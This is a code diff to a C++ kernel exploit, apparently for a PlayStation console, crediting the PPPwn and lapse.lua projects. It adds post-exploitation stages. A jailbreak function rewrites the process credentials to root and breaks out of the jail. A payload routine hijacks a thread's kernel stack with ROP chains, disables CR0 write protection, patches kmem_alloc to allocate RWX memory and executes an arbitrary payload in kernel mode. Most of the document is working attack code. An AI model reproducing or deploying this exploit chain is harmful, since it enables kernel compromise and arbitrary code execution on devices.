@@ -1324,7 +1324,7 @@ int32_t make_kernel_arw()
     printf_debug("Test read evf string:\n");
     hexdump(buf, sizeof(buf));
 
-    if (!buf_match(buf, "evf cv", 6))
+    if (!buf_match(buf, (uint8_t*)"evf cv", 6))
     {
         printf_debug("Test read failed!\n");
         return (err = -1);
@@ -1342,6 +1342,403 @@ int32_t make_kernel_arw()
     printf_debug("Corrupt pointers cleaned\n");
 
     return err;
+}
+
+ptr64_t find_thread_by_id(uint32_t thread_id)
+{
+    Kernel_Memory kmemory = Kernel_Memory(
+        pktopts_sds[0], dirty_sd, s4.pipe_fds, s4.pipe_p, s4.pipe_buffer
+    );
+    // Locate the thread object
+    // proc.p_threads.tqh_first
+    ptr64_t thread = kmemory.read64(s4.proc + 0x10);
+    while (thread != 0) {
+        uint32_t tid = kmemory.read32(thread + 0x88);
+
+        if (tid != thread_id) {
+            // Advance to the next thread in the list
+            // thread.td_plist.tqe_next
+            thread = kmemory.read64(thread + 0x10);
+            continue;
+        };
+        printf_debug("Found thread %d at address 0x%08x%08x\n",
+            tid, (uint32_t)(thread >> 32), (uint32_t)thread);
+        break;
+    }
+    return thread;
+}
+
+// Credit: https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua#L1677-L1706
+void jailbreak()
+{
+    Kernel_Memory kmemory = Kernel_Memory(
+        pktopts_sds[0], dirty_sd, s4.pipe_fds, s4.pipe_p, s4.pipe_buffer
+    );
+
+    ptr64_t ucred_p = kmemory.read64(s4.proc + PROC_UCRED);
+    ptr64_t fd_p = kmemory.read64(s4.proc + PROC_FD);
+    ptr64_t prison0 = kmemory.read64(s2.kernel_base + K_PRISON0);
+    ptr64_t rootvnode = kmemory.read64(s2.kernel_base + K_ROOTVNODE);
+
+    printf_debug("ucred_p: 0x%08x%08x\n",
+        (uint32_t)(ucred_p >> 32), (uint32_t)ucred_p);
+    printf_debug("fd_p: 0x%08x%08x\n",
+        (uint32_t)(fd_p >> 32), (uint32_t)fd_p);
+    printf_debug("prison0: 0x%08x%08x\n",
+        (uint32_t)(prison0 >> 32), (uint32_t)prison0);
+    printf_debug("rootvnode: 0x%08x%08x\n",
+        (uint32_t)(rootvnode >> 32), (uint32_t)rootvnode);
+
+    // Set ucred to root
+    kmemory.write32(ucred_p + 0x04, 0); // cr_uid
+    kmemory.write32(ucred_p + 0x08, 0); // cr_ruid
+    kmemory.write32(ucred_p + 0x0C, 0); // cr_svuid
+    kmemory.write32(ucred_p + 0x10, 1); // cr_ngroups
+    kmemory.write32(ucred_p + 0x14, 0); // cr_rgid
+
+    kmemory.write64(ucred_p + 0x30, prison0); // pr_prison
+
+    kmemory.write64(ucred_p + 0x60, -1); // cr_sceCaps[0]
+    kmemory.write64(ucred_p + 0x68, -1); // cr_sceCaps[1]
+
+    kmemory.write64(fd_p + FILEDESC_RDIR, rootvnode); // fd_rdir
+    kmemory.write64(fd_p + FILEDESC_JDIR, rootvnode); // fd_jdir
+
+    printf_debug("Jailbreak done!\n");
+}
+
+// Credit: https://github.com/TheOfficialFloW/PPPwn/blob/master/pppwn.py#L522-L611
+int32_t run_payload()
+{
+    Kernel_Memory kmemory = Kernel_Memory(
+        pktopts_sds[0], dirty_sd, s4.pipe_fds, s4.pipe_p, s4.pipe_buffer
+    );
+
+    ROP_Chain thr_chain = ROP_Chain((uint64_t*)thr_chain_buf, 0x4000);
+    if (!thr_chain.is_initialized())
+    {
+        printf_debug("Failed to initialize ROP chain!\n");
+        return (err = -1);
+    }
+
+    unixpair_s fds = {-1, -1};
+    create_unixpair(&fds);
+    uint64_t fake_buf = 0;
+    int64_t ret = -1;
+    {
+    thr_chain.push_call(
+        LIBKERNEL(LIB_KERNEL__READ),
+        fds.block_fd,
+        PVAR_TO_NATIVE(&fake_buf),
+        sizeof(fake_buf)
+    );
+    thr_chain.get_result(&ret);
+    }
+
+    ScePthread pthread = 0;
+    err = thr_chain.execute(&pthread);
+    if (err) printf_debug("Failed to execute ROP chain!\n");
+    if (err) return err;
+
+    uint32_t thread_id = (uint32_t)DEREF(pthread);
+    printf_debug("Thread spawned! ID: %ld\n", thread_id);
+    ptr64_t thread = find_thread_by_id(thread_id);
+
+    // Allow thread to run
+    sleep_ms(1000);
+    
+    // Locating thread's kernel stack
+    #define kstack_offset 0x3F0
+    ptr64_t kstack = kmemory.read64(thread + kstack_offset);
+    printf_debug("Thread's kernel stack: 0x%08x%08x\n",
+        (uint32_t)(kstack >> 32), (uint32_t)kstack);
+
+    #define PAGE_SIZE 0x4000
+    #define ROUND_PG(x) (((x) + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1))
+
+    #define KSTACK_FRAME_OFFSET 0x3AB0
+
+    // Stack grows from the bottom to the top
+    // This is why only the last 0x1000 matters
+    #define DUMP_START (PAGE_SIZE - 0x1000)
+    // We will discard trapframe that lives at the end
+    #define TRAPFRAME_SIZE (PAGE_SIZE - KSTACK_FRAME_OFFSET)
+    #define DUMP_SIZE (0x1000 - TRAPFRAME_SIZE)
+
+    uint8_t buf[DUMP_SIZE] = {0};
+    kmemory.copyout(kstack + DUMP_START, buf, sizeof(buf));
+
+    // Locating sys_read() return address on stack to hijack
+    ptr64_t read_ret = s2.kernel_base + 0x25fdfa; // K_SYS_READ_RET;
+    ptr64_t read_ret_skip_check = s2.kernel_base + 0x25fe03; // K_SYS_READ_RET_SKIP_CHECK;
+    ptr64_t ret_p = 0;
+
+    // Scanning from end to start
+    for (uint32_t i = DUMP_SIZE - 8; i > 0; i -= 8)
+    {
+        if (*(uint64_t*)&buf[i] != read_ret) continue;
+        ret_p = kstack + DUMP_START + i;
+        break;
+    }
+    if (!ret_p)
+    {
+        printf_debug("Failed to locate sys_read() return address!\n");
+        return (err = -1);
+    }
+    printf_debug("Found sys_read() return address (0x%08x%08x) at 0x%08x%08x\n",
+        (uint32_t)(read_ret >> 32), (uint32_t)read_ret,
+        (uint32_t)(ret_p >> 32), (uint32_t)ret_p);
+
+    #define CHAIN_OFFSET 0x3000
+    ptr64_t chain_p = kstack + CHAIN_OFFSET;
+
+    // Writing stack pivot gadgets
+    kmemory.write64(ret_p, s2.kernel_base + G_POP_RSP_RET);
+    kmemory.write64(ret_p + 8, chain_p);
+
+    // Writing our ROP chain
+    uint64_t *kchain_buf = (uint64_t*)chain_buf;
+    uint32_t index = 0;
+
+    {
+    // Preparing sys_write() arguments
+    char message[] = "\n\n!!! HELLO FROM KERNEL !!!\n\n";
+    struct write_args_s { int32_t fd; ptr64_t buf; size_t nbyte; }
+    write_args = { PS::Debug.sock, PVAR_TO_NATIVE(message), sizeof(message) };
+    // Copying write_args to kernel memory
+    kmemory.copyin(&write_args, kstack + 0x100, sizeof(write_args));
+
+    // setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0) to recover from UD2
+    kchain_buf[index++] = s2.kernel_base + G_POP_RDI_RET;
+    kchain_buf[index++] = 6; // IDT_UD
+    kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
+    // Skipping UD2 trap frame and returning to the next gadget
+    kchain_buf[index++] = s2.kernel_base + G_ADD_RSP_28_POP_RBP_RET; // handler
+    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
+    kchain_buf[index++] = 14; // SDT_SYSIGT
+    kchain_buf[index++] = s2.kernel_base + G_POP_RCX_RET;
+    kchain_buf[index++] = 0; // SEL_KPL
+    kchain_buf[index++] = s2.kernel_base + G_POP_R8_POP_RBP_RET;
+    kchain_buf[index++] = s2.kernel_base + 0; // DPL
+    kchain_buf[index++] = 0x13371337; // Stack alignment (for POP RBP)
+    kchain_buf[index++] = s2.kernel_base + K_SETIDT;
+
+    // Disabling write protection
+    kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
+    kchain_buf[index++] = CR0_ORI & ~CR0_WP;
+    kchain_buf[index++] = s2.kernel_base + G_MOV_CR0_RSI_UD2_MOV_EAX_1_RET;
+
+    // Patching kmem_alloc for RWX
+    kchain_buf[index++] = s2.kernel_base + G_POP_RAX_RET;
+    kchain_buf[index++] = VM_PROT_ALL;
+    kchain_buf[index++] = s2.kernel_base + G_POP_RCX_RET;
+    kchain_buf[index++] = s2.kernel_base + K_KMEM_ALLOC_PATCH1;
+    kchain_buf[index++] = s2.kernel_base + G_MOV_BYTE_PTR_RCX_AL_RET;
+    kchain_buf[index++] = s2.kernel_base + G_POP_RCX_RET;
+    kchain_buf[index++] = s2.kernel_base + K_KMEM_ALLOC_PATCH2;
+    kchain_buf[index++] = s2.kernel_base + G_MOV_BYTE_PTR_RCX_AL_RET;
+
+    // Restoring CR0
+    kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
+    kchain_buf[index++] = CR0_ORI;
+    kchain_buf[index++] = s2.kernel_base + G_MOV_CR0_RSI_UD2_MOV_EAX_1_RET;
+
+    // Restoring UD handler
+    kchain_buf[index++] = s2.kernel_base + G_POP_RDI_RET;
+    kchain_buf[index++] = 6; // IDT_UD
+    kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
+    kchain_buf[index++] = s2.kernel_base + K_XILL; // handler
+    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
+    kchain_buf[index++] = 14; // SDT_SYSIGT
+    kchain_buf[index++] = s2.kernel_base + G_POP_RCX_RET;
+    kchain_buf[index++] = 0; // SEL_KPL
+    kchain_buf[index++] = s2.kernel_base + G_POP_R8_POP_RBP_RET;
+    kchain_buf[index++] = s2.kernel_base + 0; // DPL
+    kchain_buf[index++] = 0x13371337; // Stack alignment (for POP RBP)
+    kchain_buf[index++] = s2.kernel_base + K_SETIDT;
+
+    // Calling sys_write()
+    kchain_buf[index++] = s2.kernel_base + G_POP_RDI_RET;
+    kchain_buf[index++] = thread;
+    kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
+    kchain_buf[index++] = kstack + 0x100;
+    kchain_buf[index++] = s2.kernel_base + K_WRITE;
+
+    // Allocating RWX memory
+    // kmem_alloc(*kernel_map, PAGE_SIZE) to allocate RWX memory
+    kchain_buf[index++] = s2.kernel_base + G_POP_RDI_RET;
+    kchain_buf[index++] = kmemory.read64(s2.kernel_base + K_KERNEL_MAP);
+    kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
+    kchain_buf[index++] = PAGE_SIZE;
+    kchain_buf[index++] = s2.kernel_base + K_KMEM_ALLOC;
+
+    // Passing the allocated RWX memory address
+    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
+    kchain_buf[index++] = kstack + 0x200; // RWX memory address
+    kchain_buf[index++] = s2.kernel_base + G_MOV_QWORD_PTR_RDX_RAX_POP_RBP_RET;
+    kchain_buf[index++] = 0x13371337; // Stack alignment (for POP RBP)
+
+    // Restoring sys_read() return address
+    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
+    kchain_buf[index++] = ret_p;
+    kchain_buf[index++] = s2.kernel_base + G_POP_QWORD_PTR_RDX_RET;
+    kchain_buf[index++] = read_ret_skip_check; // Skip stack overflow check
+
+    // Returning back to the original stack
+    kchain_buf[index++] = s2.kernel_base + G_POP_RSP_RET;
+    kchain_buf[index++] = ret_p;
+    }
+
+    // Chain length limit is 66 gadgets (or even less?) for some reason ;(
+    kmemory.copyin(kchain_buf, chain_p, index * 8);
+    printf_debug("ROP chain written! Length: %d\n", index);
+
+    // kmemory.copyout(kstack + DUMP_START, buf, sizeof(buf));
+    // printf_debug("Thread's kernel stack dump:\n");
+    // hexdump(buf, sizeof(buf));
+
+    ptr64_t rwx_p = kmemory.read64(kstack + 0x200);
+
+    PS::close(fds.unblock_fd);
+    PS::close(fds.block_fd);
+
+    // Obtaining RWX memory address
+    ptr64_t tmp = 0;
+    while ((tmp = kmemory.read64(kstack + 0x200)) == rwx_p)
+    {
+        printf_debug("0x%08x%08x ",
+            (uint32_t)(tmp >> 32), (uint32_t)tmp);
+        PS::Breakout::call(LIBKERNEL(LIB_KERNEL_SCHED_YIELD));
+    }
+    rwx_p = tmp;
+    printf_debug("\nRWX memory address: 0x%08x%08x\n",
+        (uint32_t)(rwx_p >> 32), (uint32_t)rwx_p);
+
+    scePthreadJoin(pthread, 0);
+    printf_debug("Thread exited.\n");
+
+    // Copying payload to RWX memory
+    kmemory.copyin((void*)payload_start, rwx_p, payload_end - payload_start);
+
+
+    /////////////////////////////////////////////////////////////
+    // Restoring pktopts_p, d_pktopts_p, and launching payload //
+    /////////////////////////////////////////////////////////////
+
+
+    fds = {-1, -1};
+    create_unixpair(&fds);
+    fake_buf = 0;
+    ret = -1;
+    {
+    thr_chain.reset();
+    thr_chain.push_call(
+        LIBKERNEL(LIB_KERNEL__READ),
+        fds.block_fd,
+        PVAR_TO_NATIVE(&fake_buf),
+        sizeof(fake_buf)
+    );
+    thr_chain.get_result(&ret);
+    }
+
+    pthread = 0;
+    err = thr_chain.execute(&pthread);
+    if (err) printf_debug("Failed to execute second ROP chain!\n");
+    if (err) return err;
+
+    thread_id = (uint32_t)DEREF(pthread);
+    printf_debug("Second thread spawned! ID: %ld\n", thread_id);
+    thread = find_thread_by_id(thread_id);
+
+    // Allow thread to run
+    sleep_ms(1000);
+    
+    // Locating thread's kernel stack
+    kstack = kmemory.read64(thread + kstack_offset);
+    printf_debug("Second thread's kernel stack: 0x%08x%08x\n",
+        (uint32_t)(kstack >> 32), (uint32_t)kstack);
+
+    kmemory.copyout(kstack + DUMP_START, buf, sizeof(buf));
+
+    // Locating sys_read() return address on stack to hijack
+    ret_p = 0;
+
+    // Scanning from end to start
+    for (uint32_t i = DUMP_SIZE - 8; i > 0; i -= 8)
+    {
+        if (*(uint64_t*)&buf[i] != read_ret) continue;
+        ret_p = kstack + DUMP_START + i;
+        break;
+    }
+    if (!ret_p)
+    {
+        printf_debug("Failed to locate sys_read() return address!\n");
+        return (err = -1);
+    }
+    printf_debug("Found sys_read() return address (0x%08x%08x) at 0x%08x%08x\n",
+        (uint32_t)(read_ret >> 32), (uint32_t)read_ret,
+        (uint32_t)(ret_p >> 32), (uint32_t)ret_p);
+
+    chain_p = kstack + CHAIN_OFFSET;
+
+    /*
+        let map_size = patches.size;
+        const max_size = 0x10000000;
+        if (map_size > max_size) {
+            die(`patch file too large (>${max_size}): ${map_size}`);
+        }
+        if (map_size === 0) {
+            die("patch file size is zero");
+        }
+        log(`kpatch size: ${map_size} bytes`);
+        map_size = (map_size + page_size) & -page_size;
+    */
+
+    // Writing stack pivot gadgets
+    kmemory.write64(ret_p, s2.kernel_base + G_POP_RSP_RET);
+    kmemory.write64(ret_p + 8, chain_p);
+
+    // Writing our ROP chain
+    index = 0;
+
+    {
+    // Restoring pktopts_p
+    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
+    kchain_buf[index++] = s4.pktopts_p + IPV6_PKTINFO_OFFSET;
+    kchain_buf[index++] = s2.kernel_base + G_POP_QWORD_PTR_RDX_RET;
+    kchain_buf[index++] = 0;
+
+    // Restoring d_pktopts_p
+    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
+    kchain_buf[index++] = s4.d_pktopts_p + IPV6_PKTINFO_OFFSET;
+    kchain_buf[index++] = s2.kernel_base + G_POP_QWORD_PTR_RDX_RET;
+    kchain_buf[index++] = 0;
+
+    // Executing payload
+    kchain_buf[index++] = rwx_p;
+
+    // Restoring sys_read() return address
+    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
+    kchain_buf[index++] = ret_p;
+    kchain_buf[index++] = s2.kernel_base + G_POP_QWORD_PTR_RDX_RET;
+    kchain_buf[index++] = read_ret_skip_check; // Skip stack overflow check
+
+    // Returning back to the original stack
+    kchain_buf[index++] = s2.kernel_base + G_POP_RSP_RET;
+    kchain_buf[index++] = ret_p;
+    }
+
+    // Chain length limit is 66 gadgets for some reason ;(
+    kmemory.copyin(kchain_buf, chain_p, index * 8);
+    printf_debug("ROP chain written! Length: %d\n", index);
+
+    // Resume thread
+    PS::close(fds.unblock_fd);
+    PS::close(fds.block_fd);
+    scePthreadJoin(pthread, 0);
+    printf_debug("Thread exited.\n");
+
+    return 0;
 }
 
 void cleanup()
@@ -1372,16 +1769,16 @@ void cleanup()
 
     // TODO: reconsider this
     // Close sd_listen
-    if (sd_listen > 0) PS::close(sd_listen);
+    // if (sd_listen > 0) PS::close(sd_listen);
 
     // Destroy the pthread barrier
-    if (barrier != 0) scePthreadBarrierDestroy(&barrier);
+    // if (barrier != 0) scePthreadBarrierDestroy(&barrier);
 
     // Close rthdr_sds[0]
-    if (rthdr_sds[0] > 0) PS::close(rthdr_sds[0]);
+    // if (rthdr_sds[0] > 0) PS::close(rthdr_sds[0]);
 
     // Free evf
-    if (s2.evf != 0) free_evf(s2.evf);
+    // if (s2.evf != 0) free_evf(s2.evf);
 }
 
 // overview:
@@ -1400,7 +1797,9 @@ void main()
     PS::Breakout::init();
 
     // Attempt to connect to debug server
-    PS::Debug.connect(IP(192, 168, 1, 39), 9023);
+    PS::Debug.connect(IP(192, 168, 1, 35), 9023);
+
+    printf_debug("** Socket: %d\n", PS::Debug.sock);
 
     // HELLO EVERYNYAN!
     Okage::printf("HELL%d\nEVERYNYAN!\n", 0);
@@ -1412,6 +1811,7 @@ void main()
     printf_debug("payload_start: %p, payload_end: %p, size: %d\n",
         payload_start, payload_end, payload_end - payload_start);
 
+    // Exploitation
     // STAGE 0: Setup
     if (setup() != 0) goto end;
 
@@ -1423,14 +1823,20 @@ void main()
 
     // STAGE 3: Double free SceKernelAioRWRequest
     if (double_free_reqs1() != 0) goto end;
+    // err = 42; goto end;
 
     // STAGE 4: Get arbitrary kernel read/write
     if (make_kernel_arw() != 0) goto end;
 
+    // Post exploitation
+    cleanup();
+    jailbreak();
+    if (run_payload() != 0) goto end;
+    
     end:
-        cleanup();
         if (err != 0)
         {
+            cleanup();
             printf_debug("Something went wrong! Error: %d\n", err);
             PS::Breakout::restore(); // Restore corruption
         }
